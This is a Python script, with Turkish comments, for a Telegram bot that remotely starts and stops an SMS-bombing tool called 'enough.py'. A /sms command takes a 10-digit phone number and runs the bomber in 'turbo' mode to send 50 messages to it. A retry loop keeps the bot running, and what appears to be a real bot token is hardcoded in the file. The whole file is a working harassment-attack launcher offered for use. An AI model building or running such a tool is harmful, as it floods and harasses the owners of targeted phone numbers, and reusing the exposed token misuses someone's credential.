import telebot
import subprocess
import sys
import os
import time

# --- AYARLAR ---
TOKEN = "8329769755:AAHmwTY0UWSu16pec8dhZFdq3Gtf8yiaaLw"
bot = telebot.TeleBot(TOKEN)

# Aktif saldırı sürecini takip etmek için
mevcut_saldiri = None

# --- KOMUTLAR ---
@bot.message_handler(commands=['start'])
def welcome(message):
    msg = (
        "🚀 **Enough-Reborn Turbo Kontrol Merkezi**\n\n"
        "Saldırı Başlat: `/sms 5051112233`\n"
        "Saldırı Durdur: `/durdur`"
    )
    bot.reply_to(message, msg, parse_mode="Markdown")

@bot.message_handler(commands=['sms'])
def start_attack(message):
    global mevcut_saldiri
    try:
        komut_parcalari = message.text.split()
        if len(komut_parcalari) < 2:
            bot.reply_to(message, "❌ Kullanım: /sms 5051112233")
            return
            
        numara = komut_parcalari[1]
        if len(numara) != 10:
            bot.reply_to(message, "⚠️ Numara 10 haneli olmalı (Örn: 5051112233)")
            return

        if mevcut_saldiri and mevcut_saldiri.poll() is None:
            bot.reply_to(message, "⚠️ Devam eden bir operasyon var! Önce /durdur yazmalısın.")
            return

        bot.reply_to(message, f"⚡ {numara} için Turbo (Mod 2) operasyonu tetiklendi...")

        # Enough-Reborn Girdi Zinciri: 2 (Turbo Mod) -> Numara -> Enter -> 50 (Adet)
        girdiler = f"2\n{numara}\n\n50\n"

        # enough.py dosyasının aynı dizinde olduğundan emin ol
        mevcut_saldiri = subprocess.Popen(
            [sys.executable, "enough.py"],
            stdin=subprocess.PIPE,
            text=True
        )
        
        mevcut_saldiri.stdin.write(girdiler)
        mevcut_saldiri.stdin.flush()

    except Exception as e:
        bot.reply_to(message, f"❌ Hata oluştu: {str(e)}")

@bot.message_handler(commands=['durdur'])
def stop_attack(message):
    global mevcut_saldiri
    if mevcut_saldiri and mevcut_saldiri.poll() is None:
        mevcut_saldiri.terminate()
        bot.reply_to(message, "🛑 Operasyon durduruldu. Bot yeni emir bekliyor!")
        mevcut_saldiri = None
    else:
        bot.reply_to(message, "🧐 Şu an çalışan aktif bir saldırı yok.")

# --- İNATÇI DÖNGÜ (HATALARI AŞAR) ---
def run_bot():
    print("--- BOT BAŞLATILDI: BAĞLANTI DENENİYOR ---")
    while True:
        try:
            # timeout değerlerini yükselterek DNS gecikmelerine karşı botu güçlendirdik
            bot.infinity_polling(timeout=90, long_polling_timeout=30)
        except Exception as e:
            # İnternet gelene kadar botu kapatmaz, her 5 saniyede bir yeniden dener
            print(f"Bağlantı bekleniyor (Hata: {e})... 5 saniye sonra tekrar!")
            time.sleep(5)

if __name__ == "__main__":
    run_bot()